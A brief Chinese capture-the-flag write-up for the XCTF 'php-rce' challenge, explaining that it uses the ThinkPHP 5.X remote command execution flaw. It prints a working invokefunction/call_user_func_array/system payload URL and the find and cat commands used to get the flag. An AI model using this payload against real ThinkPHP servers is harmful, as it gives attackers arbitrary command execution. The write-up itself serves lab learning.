**题名：**php-rce
**地址：**攻防世界web高手进阶区第三题

# 解法
本题设计ThinkPHP 5.X RCE（远程命令执行）漏洞。
payload形如：?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=要执行的命令。
类似于初级区的CE题，命令分别为
find / -name flag
然后cat /flag
至于这个payload有待于php水平的进一步提高去理解。